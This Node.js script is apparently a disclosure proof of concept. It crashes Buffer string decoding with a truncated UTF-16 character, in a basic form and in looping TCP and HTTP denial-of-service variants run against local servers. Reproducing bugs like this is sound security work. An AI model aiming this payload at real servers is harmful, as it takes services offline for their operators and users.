'use strict';

var http = require('http');
var net = require('net');
var LEN = 1024 * 64;
var PORT = 8123;
var log = process._rawDebug;


///// BASIC ATTACK /////

/**
 * This sample code demonstrates the simplest way to reproduce the issue.
 */
var b = Buffer(LEN);
b.fill('\ud834\udc1e');
b = b.slice(0, LEN - 3);
b.toString();



///// TCP ATTACK /////

/**
 * This demonstrates exploiting packet size to force a malformed UTF-16
 * character throw to be turned to a string by the unexpecting victim.
 */
var b = Buffer(LEN).fill('\ud834\udc1e').slice(0, LEN - 3);

net.createServer(function(c) {
  c.on('data', function(chunk) {
    chunk.toString();
    this.end();
  });
}).listen(8123, function(e) {
  if (e) throw e;
  startClient();
});

function startClient() {
  net.connect(PORT, function() {
    log('client connected');
    this.write(b);
    this.end();
  }).on('end', function() {
    setImmediate(startClient);
  });
}



///// HTTP ATTACK /////

/**
 * This shows an attack vector that could be used to bring down an HTTP server.
 * Though because of implementation details, it requires explicit action by the
 * implementor.
 *
 * Fortunately a perf improvement I recommended to Isaac a while back (1f9f863)
 * helps guard against this attack on http, but doesn't prevent it if the user
 * takes explicit action.
 */
var b = Buffer(LEN).fill('\ud834\udc1e').slice(0, LEN - 3);
var cH = 'GET / HTTP/1.1\r\n' +
         'User-Agent: '

b.write(cH);
b.write('\r\n\r\n', b.length - 4);

http.createServer(function(req, res) {
  log('connection received');
  Buffer(req.headers['user-agent'], 'binary').toString('utf8');
  res.end();
}).listen(PORT, function(e) {
  if (e) throw e;
  startClient();
});

function startClient() {
  net.connect(PORT, function() {
    this.write(b);
    this.end();
  }).on('end', function() {
    setImmediate(startClient);
  }).on('data', function() { });
}
